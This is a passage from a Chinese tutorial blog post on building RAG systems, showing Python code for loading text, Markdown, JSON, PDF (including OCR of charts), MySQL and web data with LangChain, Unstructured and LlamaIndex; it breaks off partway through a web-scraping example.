td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">RAG</h2>
<p>RAG 是 <strong>Retrieval-Augmented Generation（检索增强生成）</strong> 的缩写，是一种结合「外部知识检索」和「大语言模型生成」的技术方案。通俗的来说是通过大模型来回答问题的时候，去检索外部知识库的相关信息，在基于这些信息生成内容。</p>
<p>可能有的亦菲、彦祖们要问了，为啥需要检索外部的知识库，我直接问大模型不行吗。如果是问一些基本知识，是可以的。但是想要问一些最新资料，或者是私有资料的内容，是不行的！因为大模型的知识是“固化”在训练数据里的，无法实时更新，更不了解私有资料的内容。所以通过RAG检索到资料的数据，将数据传递给大模型，让其基于这些数据生成你想要的回答。</p>
<h2 data-id="heading-1">应用背景</h2>
<p>那么RAG技术可以干什么？可以搭建以下系统：</p>
<ul>
<li>企业内部知识库：将企业文档存入RAG知识库，系统回答对应的文档内容，避免人工大量的翻阅文档</li>
<li>智能客服：将最新的业务规则和产品手册存入RAG知识库，系统回答客户产品相关问题</li>
<li>金融/医疗等合规性行业：将合规文档和行业指南存入RAG数据库，让系统给出建议和总结</li>
</ul>
<h2 data-id="heading-2">技术实现</h2>
<h3 data-id="heading-3">数据加载</h3>
<p>做RAG系统的第一步就是数据的导入，接下来简单列下数据加载的各种技术，供各位亦菲、彦祖们参考</p>
<h4 data-id="heading-4">所用技术</h4>
<h5 data-id="heading-5">Langchain</h5>
<p>LangChain 是什么，是一个专为<strong>构建大语言模型（LLM）驱动的应用程序设计的开源框架</strong>。主要是让开发者能快速的构建出复杂的LLM应用，比如我们文中所提到的RAG系统。框架提供了以下的核心功能，用来构建复杂的LLM应用。</p>
<ul>
<li>工具集成：连接各种API和外部工具</li>
<li>记忆：管理对话历史</li>
<li>链式调用：将多个LLM调用和工具结合起来</li>
<li>代理：让LLM自主决策和使用工具</li>
</ul>
<p>官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.langchain.com%2F" target="_blank" title="https://docs.langchain.com/" ref="nofollow noopener noreferrer">docs.langchain.com/</a></p>
<h5 data-id="heading-6">LIamaIndex</h5>
<p>LIamaIndex 是一套 <strong>专注于「文档理解与知识库问答」的开源框架</strong>，尤其适用于RAG系统，擅长文档处理、检索优化。官方网站: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.llamaindex.ai%2F" target="_blank" title="https://www.llamaindex.ai/" ref="nofollow noopener noreferrer">www.llamaindex.ai/</a></p>
<h5 data-id="heading-7">Unstructured</h5>
<p>Unstructured 是一款专注于<strong>非结构化文档数据处理的开源工具库</strong>，核心能力将复杂的文档（PDF、Word、网页）和非结构化文档转换成规整，可直接供给大模型或RAG使用的结构化数据。官方文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.unstructured.io%2F" target="_blank" title="https://docs.unstructured.io/" ref="nofollow noopener noreferrer">docs.unstructured.io/</a></p>
<p>看到这儿，有的小伙伴可能会问，为啥我会选择 Python的技术框架，而不用Java的 <strong>Langchain4j</strong>。因为在 Python 生态下构建 LLM/RAG 应用，LangChain 远比 langchain4j 更丰富、更好用！</p>
<h4 data-id="heading-8">环境准备</h4>
<ol>
<li>下载安装 <strong>Miniconda</strong>, Miniconda是一个轻量级的 Python 环境管理工具，仅包含 conda 包管理器和 Python 核心，可便捷创建、管理独立的 Python 环境。国内镜像地址: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmirrors.tuna.tsinghua.edu.cn%2Fanaconda%2Fminiconda%2F" target="_blank" title="https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/" ref="nofollow noopener noreferrer">mirrors.tuna.tsinghua.edu.cn/anaconda/mi…</a></li>
<li>创建一个requeriment.txt文件，管理各种依赖:</li>
</ol>

<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">核心LLM框架依赖</span>
<span class="hljs-meta prompt_">llama-index&gt;</span><span class="bash">=0.10.0</span>
<span class="hljs-meta prompt_">python-dotenv&gt;</span><span class="bash">=1.0.0</span>
<span class="hljs-meta prompt_">openai&gt;</span><span class="bash">=1.0.0</span>
<span class="hljs-meta prompt_">langchain&gt;</span><span class="bash">=0.1.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">关键升级：langchain-community 需 &gt;= 0.2.0 才支持 headers 参数</span>
<span class="hljs-meta prompt_">langchain-community&gt;</span><span class="bash">=0.2.0</span>
<span class="hljs-meta prompt_">langchain-openai&gt;</span><span class="bash">=0.1.0</span>
<span class="hljs-meta prompt_">langchain-text-splitters&gt;</span><span class="bash">=0.0.1</span>
<span class="hljs-meta prompt_">langchain-core&gt;</span><span class="bash">=0.1.0</span>
<span class="hljs-meta prompt_">langchain-huggingface&gt;</span><span class="bash">=0.0.3</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">文本处理/嵌入依赖</span>
<span class="hljs-meta prompt_">sentence-transformers&gt;</span><span class="bash">=2.2.0</span>
<span class="hljs-meta prompt_">markdown&gt;</span><span class="bash">=3.4.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">文档解析依赖</span>
<span class="hljs-meta prompt_">unstructured&gt;</span><span class="bash">=0.10.30</span>
<span class="hljs-meta prompt_">unstructured[pdf]&gt;</span><span class="bash">=0.10.30</span>
<span class="hljs-meta prompt_">unstructured[ppt]&gt;</span><span class="bash">=0.10.30</span>
<span class="hljs-meta prompt_">langchain-unstructured&gt;</span><span class="bash">=0.1.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">Windows 系统依赖（解决文件解析/路径问题）</span>
<span class="hljs-meta prompt_">pywin32&gt;</span><span class="bash">=306</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">Unstructured 解析 markdown 必需的依赖</span>
<span class="hljs-meta prompt_">markdown-it-py&gt;</span><span class="bash">=3.0.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">PDF/OCR相关依赖</span>
<span class="hljs-meta prompt_">pdf2image&gt;</span><span class="bash">=1.16.0</span>
<span class="hljs-meta prompt_">pytesseract&gt;</span><span class="bash">=0.3.10</span>
​
​
<span class="hljs-meta prompt_"># </span><span class="bash">图片识别核心依赖（PaddleOCR 方案）</span>
<span class="hljs-meta prompt_">paddlepaddle&gt;</span><span class="bash">=2.6.0</span>
<span class="hljs-meta prompt_">paddleocr&gt;</span><span class="bash">=2.7.0</span>
<span class="hljs-meta prompt_">pillow&gt;</span><span class="bash">=10.0.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">llama-index 核心依赖（数据库读取功能）</span>
<span class="hljs-meta prompt_">llama-index-readers-database&gt;</span><span class="bash">=0.1.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">MySQL 数据库驱动（必须）</span>
<span class="hljs-meta prompt_">mysql-connector-python&gt;</span><span class="bash">=8.0.0</span>
<span class="hljs-meta prompt_"># </span><span class="bash">或备选驱动（二选一，推荐上面的）</span>
<span class="hljs-meta prompt_"># </span><span class="bash">pymysql&gt;=1.1.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">新增：SQLAlchemy 适配 MySQL 的依赖</span>
<span class="hljs-meta prompt_">sqlalchemy&gt;</span><span class="bash">=2.0.0</span>
​
​
<span class="hljs-meta prompt_"># </span><span class="bash">核心依赖</span>
<span class="hljs-meta prompt_">fastapi&gt;</span><span class="bash">=0.115.0</span>
<span class="hljs-meta prompt_">uvicorn[standard]&gt;</span><span class="bash">=0.32.0</span>
<span class="hljs-meta prompt_">pydantic&gt;</span><span class="bash">=2.0.0</span>
<span class="hljs-meta prompt_">pydantic-settings&gt;</span><span class="bash">=2.0.0</span>
​
<span class="hljs-meta prompt_"># </span><span class="bash">扩展依赖（你的场景需要）</span>
<span class="hljs-meta prompt_">python-multipart&gt;</span><span class="bash">=0.0.17  <span class="hljs-comment"># 文件上传</span></span>
<span class="hljs-meta prompt_">python-dotenv&gt;</span><span class="bash">=1.0.0  <span class="hljs-comment"># 读取.env文件</span></span>
<span class="hljs-meta prompt_">requests&gt;</span><span class="bash">=2.32.0  <span class="hljs-comment"># 调用AI接口</span></span>
​
<span class="hljs-meta prompt_">#</span><span class="bash">数据分析</span>
<span class="hljs-meta prompt_">pandas&gt;</span><span class="bash">=2.2.2</span>
</code></pre>
<h4 data-id="heading-9">实现</h4>
<h5 data-id="heading-10">文本</h5>
<p>Unstructured 加载 txt、md格式数据，代码如下：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> unstructured.partition.text <span class="hljs-keyword">import</span> partition_text
<span class="hljs-keyword">from</span> unstructured.partition.md <span class="hljs-keyword">import</span> partition_md
​
text_file = <span class="hljs-string">"../../document/企业概况与分析框架.txt"</span>
md_file = <span class="hljs-string">"../../document/企业财务报表分析.md"</span>
​
​
<span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_and_analyze_elements</span>(<span class="hljs-params">elements, file_type</span>):
​
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n========== 解析 <span class="hljs-subst">{file_type}</span> 文件 =========="</span>)
​
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n【原始元素输出】:"</span>)
    <span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> elements:
        <span class="hljs-built_in">print</span>(element)
    <span class="hljs-comment"># 详细分析每个元素的元数据</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n【元素详细元数据】:"</span>)
    <span class="hljs-keyword">for</span> i, element <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(elements):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n--- 第 <span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span> 个元素 ---"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"元素类型: <span class="hljs-subst">{element.__class__.__name__}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"文本内容: <span class="hljs-subst">{element.text.strip() <span class="hljs-keyword">or</span> <span class="hljs-string">'无文本内容'</span>}</span>"</span>)
​
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(element, <span class="hljs-string">"metadata"</span>) <span class="hljs-keyword">and</span> element.metadata:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"元数据:"</span>)
            <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> element.metadata.__dict__.items():
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> key.startswith(<span class="hljs-string">"_"</span>) <span class="hljs-keyword">and</span> value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  • <span class="hljs-subst">{key}</span>: <span class="hljs-subst">{value}</span>"</span>)
​
​
<span class="hljs-comment"># 1. 解析文本文件</span>
text_elements = partition_text(text_file)
parse_and_analyze_elements(text_elements, <span class="hljs-string">"文本(TXT)"</span>)
​
<span class="hljs-comment"># 2. 解析MD文件</span>
md_elements = partition_md(md_file)
parse_and_analyze_elements(md_elements, <span class="hljs-string">"Markdown(MD)"</span>)
</code></pre>
<p>返回：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24ec838058f544b9931012ef3658b6cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=F1tlDHGRKi8zLhTUsxCTG3Y4XB4%3D" alt="txt_1.png" loading="lazy"/></p>
<p>Langchain 加载 txt、md、json格式数据，代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">from langchain_community.document_loaders import (
    TextLoader,
    JSONLoader,
    UnstructuredMarkdownLoader,
)
​
<span class="hljs-comment"># 加载txt</span>
<span class="hljs-attr">loader</span> = TextLoader(<span class="hljs-string">"../../document/企业概况与分析框架.txt"</span>, encoding=<span class="hljs-string">"utf-8"</span>)
<span class="hljs-attr">documents</span> = loader.load()
print(documents)
​
<span class="hljs-comment"># 加载整个json</span>
<span class="hljs-attr">loader2</span> = JSONLoader(
    <span class="hljs-attr">file_path</span>=<span class="hljs-string">"../../document/企业概况与分析框架.json"</span>,
    <span class="hljs-attr">jq_schema</span>=<span class="hljs-string">"."</span>,
    <span class="hljs-attr">text_content</span>=<span class="hljs-literal">False</span>,
)
<span class="hljs-attr">documents2</span> = loader2.load()
print(documents2)
​
<span class="hljs-comment"># 加载md</span>
<span class="hljs-attr">markdown_path</span> = <span class="hljs-string">"../../document/企业财务报表分析.md"</span>
<span class="hljs-attr">loader</span> = UnstructuredMarkdownLoader(markdown_path)
​
<span class="hljs-attr">data</span> = loader.load()
print(data<span class="hljs-section">[0]</span>.page_content<span class="hljs-section">[:100]</span>)
​
</code></pre>
<p>返回：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/441b8ce1d70b48fc909a597cf392ebf3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=yhFTpdNB7iRMxsLyWexxib7TTyM%3D" alt="txt_2.png" loading="lazy"/></p>
<p>两者的不同之处：langchain输出的是 标准的<code>Document</code>对象，结构非常简单；Unstructured 输出的是其专属的元素对象，会按照语义进行拆分文件，能够自动识别文中的标题、段落、列表和表格等结构，拆分成不同类型的元素，元数据也更详细（比如某段文字在文件的第几行）。</p>
<h5 data-id="heading-11">PDF</h5>
<p>Langchain加载PDF格式代码如下：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> langchain_community.document_loaders <span class="hljs-keyword">import</span> PyPDFLoader, PyMuPDFLoader, PDFPlumberLoader
​
PDF_PATH = <span class="hljs-string">"../../document/企业财务报表分析-图表.pdf"</span>
LOADERS = {<span class="hljs-string">"PyPDFLoader"</span>: PyPDFLoader, <span class="hljs-string">"PyMuPDFLoader"</span>: PyMuPDFLoader, <span class="hljs-string">"PDFPlumberLoader"</span>: PDFPlumberLoader}
​
<span class="hljs-comment"># 1. 耗时对比</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"=== 耗时对比 ==="</span>)
results = {}
<span class="hljs-keyword">for</span> name, cls <span class="hljs-keyword">in</span> LOADERS.items():
    t0 = time.perf_counter()
    docs = cls(PDF_PATH).load()
    results[name] = docs
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{name}</span>：页数=<span class="hljs-subst">{<span class="hljs-built_in">len</span>(docs)}</span>，耗时=<span class="hljs-subst">{time.perf_counter()-t0:<span class="hljs-number">.3</span>f}</span>s"</span>)
​
<span class="hljs-comment"># 2. 效果预览</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== 抽取效果预览==="</span>)
<span class="hljs-keyword">for</span> name, docs <span class="hljs-keyword">in</span> results.items():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"---------------------------------------------------------"</span>)
    preview = docs[<span class="hljs-number">1</span>].page_content[:<span class="hljs-number">500</span>].strip() <span class="hljs-keyword">if</span> docs <span class="hljs-keyword">else</span> <span class="hljs-string">"无内容"</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{name}</span>: <span class="hljs-subst">{preview}</span>"</span>)
    preview2 = docs[<span class="hljs-number">9</span>].page_content[:<span class="hljs-number">500</span>].strip() <span class="hljs-keyword">if</span> docs <span class="hljs-keyword">else</span> <span class="hljs-string">"无内容"</span>
    meta9 = docs[<span class="hljs-number">9</span>].metadata
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{name}</span>: <span class="hljs-subst">{preview2}</span> <span class="hljs-subst">{meta9}</span>"</span>)
</code></pre>
<p>返回：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f7378efd58f4220a179ce93b0f55536~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=31PYymHc0l3N%2Fzxc9ARklKk60is%3D" alt="pdf_1.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fdb6a53a5e945308174d1db40e09afc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=v9dUggrkxPrjNr0NLfAfNATJOgw%3D" alt="pdf_2.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70c01e8609dd409aaf905b6bb2b2fd95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=xB7l620pCHmgWY8bHhJBvQ1CfLE%3D" alt="pdf_3.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce6e7a9d2c1d4e49be828969dc3b3ce9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=AjGASV65OO98WKlXSLw7HJJm2qc%3D" alt="pdf_4.png" loading="lazy"/></p>
<p>从返回的结果来看PyMuPDFLoader是最快的，但是PDF中的表格结构化提取不是很好，显示的内容很乱。其次是PyPDFLoader提取速度比PyMuPDFLoader慢点，但是可以对pdf表格结构化提取。最后PDFPlumberLoader是最慢的，不过也是可以对pdf表格结构化提取，对表格化提取支持比较好。这三个的对比如下：</p>



































<table><thead><tr><th>场景</th><th>首选加载器</th><th>原因</th></tr></thead><tbody><tr><td>批量解析大量纯文本 PDF</td><td>PyMuPDFLoader</td><td>速度快、兼容性强</td></tr><tr><td>提取 PDF 中的表格（如财务报表）</td><td>PDFPlumberLoader</td><td>表格结构化提取</td></tr><tr><td>轻量部署（无多余依赖）</td><td>PyPDFLoader</td><td>仅依赖 PyPDF2，体积小</td></tr><tr><td>需提取批注 / 图片</td><td>PyMuPDFLoader</td><td>唯一支持图片 / 批注解析</td></tr><tr><td>复杂排版 PDF（分栏 / 嵌套列表）</td><td>PDFPlumberLoader</td><td>解析结果最精准</td></tr></tbody></table>
<p>Unstructured 加载PDF格式代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">from unstructured.partition.auto import partition
<span class="hljs-attr">PDF_PATH</span> = <span class="hljs-string">"../../document/企业财务报表分析.pdf"</span>
<span class="hljs-attr">elements</span> = partition(filename=PDF_PATH,content_type=<span class="hljs-string">"application/pdf"</span>)
print("\n\n".join(<span class="hljs-section">[str(e) for e in elements]</span>))
</code></pre>
<p>结果：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae1962b514ce408d8209052fa6116634~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=h9qB2cIJPvm9w9qkzAItFCanWFY%3D" alt="pdf_4.1.png" loading="lazy"/></p>
<p>Unstructured 的特点是，语义结构化解析，会自动识别 PDF 中的标题（<code>Title</code>）、段落（<code>NarrativeText</code>）、列表项（<code>ListItem</code>）、表格（<code>Table</code>）等元素，拆分后返回不同类型的对象</p>
<p>不过以上说的都无法提取PDF中的折线图等图表的数据。如果遇到有很多图表数据需要解析和提取，有以下解决方案。通过“<strong>PDF 转图片 + OCR 文字识别</strong>”的方法，提取pdf中的图表数据。</p>
<p>PDF 转图片 + OCR 文字识别方法实现：</p>
<p>首先安装依赖：</p>
<p>PDF2image 需要手动安装 poppler</p>
<ul>
<li><strong>Windows</strong> 下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foschwartz10612%2Fpoppler-windows%2Freleases" target="_blank" title="https://github.com/oschwartz10612/poppler-windows/releases" ref="nofollow noopener noreferrer">github.com/oschwartz10…</a></li>
<li><strong>macOS</strong> 通过 Homebrew 安装: brew install poppler</li>
<li><strong>Linux</strong> 命令 sudo apt install poppler-utils、sudo yum install poppler-utils</li>
</ul>
<p>Tesseract-OCR 下载地址（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftesseract-ocr%2Ftesseract%2Freleases" target="_blank" title="https://github.com/tesseract-ocr/tesseract/releases" ref="nofollow noopener noreferrer">github.com/tesseract-o…</a>），需安装中文语言包（安装时勾选 “chi_sim”，或手动复制语言包到<code>tessdata</code>目录）</p>
<ul>
<li><strong>Windows</strong> 下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FUB-Mannheim%2Ftesseract%2Fwiki" target="_blank" title="https://github.com/UB-Mannheim/tesseract/wiki" ref="nofollow noopener noreferrer">github.com/UB-Mannheim…</a></li>
<li><strong>macOS</strong> 通过 Homebrew 安装：brew install tesseract tesseract-lang</li>
<li><strong>Linux</strong> 命令 sudo apt install tesseract-ocr tesseract-ocr-chi-sim、sudo yum install tesseract tesseract-langpack-chi_sim</li>
</ul>
<p>代码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> pdf2image
<span class="hljs-keyword">import</span> pytesseract
<span class="hljs-keyword">import</span> os
​
<span class="hljs-comment"># 创建 output 目录</span>
PDF_PATH = <span class="hljs-string">'../../document/企业财务报表分析-图表.pdf'</span>
OUTPUT_DIR = <span class="hljs-string">'output'</span>
POPPLER_PATH = <span class="hljs-string">r'D:\Program Files\poppler-windows\poppler-25.12.0\Library\bin'</span>  <span class="hljs-comment"># 你的poppler bin路径</span>
TESSERACT_PATH = <span class="hljs-string">r'D:\Program Files\Tesseract-OCR\tesseract.exe'</span> 
​
pytesseract.pytesseract.tesseract_cmd = TESSERACT_PATH
​
<span class="hljs-comment"># 创建output目录，已存在则不报错</span>
os.makedirs(OUTPUT_DIR, exist_ok=<span class="hljs-literal">True</span>)
​
<span class="hljs-comment"># PDF转图片（关键：传poppler_path参数，解决poppler依赖）</span>
<span class="hljs-comment"># dpi=300提高图片清晰度，让OCR识别更准确</span>
images = pdf2image.convert_from_path(
    pdf_path=PDF_PATH,
    poppler_path=POPPLER_PATH,
    dpi=<span class="hljs-number">300</span>
)
​
<span class="hljs-comment"># 保存转换后的图片</span>
<span class="hljs-keyword">for</span> i, image <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(images):
    img_save_path = <span class="hljs-string">f'<span class="hljs-subst">{OUTPUT_DIR}</span>/page_<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>.png'</span>
    image.save(img_save_path)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"已保存PDF第<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>页为图片：<span class="hljs-subst">{img_save_path}</span>"</span>)
​
<span class="hljs-comment"># 用pytesseract提取简体中文文本</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n开始提取各页文本：\n"</span> + <span class="hljs-string">"-"</span>*<span class="hljs-number">60</span>)
<span class="hljs-keyword">for</span> i, image <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(images):
    <span class="hljs-comment"># lang='chi_sim'指定简体中文，依赖安装时勾选的中文语言包</span>
    text = pytesseract.image_to_string(image, lang=<span class="hljs-string">'chi_sim'</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"【PDF第<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>页提取的文本】"</span>)
    <span class="hljs-comment"># 处理无文本的情况，避免打印空行</span>
    <span class="hljs-built_in">print</span>(text <span class="hljs-keyword">if</span> text.strip() <span class="hljs-keyword">else</span> <span class="hljs-string">"该页未识别到有效文本"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span>*<span class="hljs-number">60</span> + <span class="hljs-string">"\n"</span>)
</code></pre>
<p>返回：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94ac1caeb02e4e7ba19f93715b3a6961~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=%2FYUpCQeuK%2B7iJO0HYeyerA4P7l8%3D" alt="pdf_5.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48ca4f7693f84198b758c22d4a683f7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=A5oJ3l%2FIEY2SYZsY8IncKHrBfYA%3D" alt="pdf_6.png" loading="lazy"/>
从返回可以看出将pd转换成图片后，对图片进行识别，可以识别到图表的数据，不过这种方法比较耗时。</p>
<h5 data-id="heading-12">数据库</h5>
<p>sqlalchemy加载数据库数据，代码如下：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
<span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine, text
​
engine = create_engine(<span class="hljs-string">"mysql+mysqlconnector://root:root@localhost:3306/seckill"</span>)
df = pd.read_sql(text(<span class="hljs-string">"SELECT * FROM user"</span>), engine)
<span class="hljs-built_in">print</span>(df)
</code></pre>
<p>返回：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23e5ce94bc7a4f42a5130559d0a5bb87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=Zl7rJxGLq6kpc8KMNNANRppASgc%3D" alt="db_1.png" loading="lazy"/></p>
<p>llama_index加载数据库数据，代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">from llama_index.readers.database import DatabaseReader
<span class="hljs-attr">db_uri</span> = <span class="hljs-string">"mysql+mysqlconnector://root:root@localhost:3306/seckill"</span>
<span class="hljs-attr">reader</span> = DatabaseReader(
    <span class="hljs-attr">uri</span>=db_uri
)
<span class="hljs-attr">query</span> = <span class="hljs-string">"SELECT * FROM user"</span>
<span class="hljs-attr">documents</span> = reader.load_data(query=query)
print(f"从数据库加载的文档数量: {len(documents)}")
print(documents)
</code></pre>
<p>结果：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12daac79ad6e4c7695916f0afa28dd08~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=Mi9DVmm2lvKPzzPyVUcNTIFz580%3D" alt="db_2.png" loading="lazy"/></p>
<h5 data-id="heading-13">网页</h5>
<p>Langchain加载网页数据，代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">import requests
from langchain_community.document_loaders import WebBaseLoader
​
<span class="hljs-attr">page_url</span> = <span class="hljs-string">"https://books.toscrape.com"</span>
​
def custom_scrape(url):
    <span class="hljs-attr">headers</span> = {
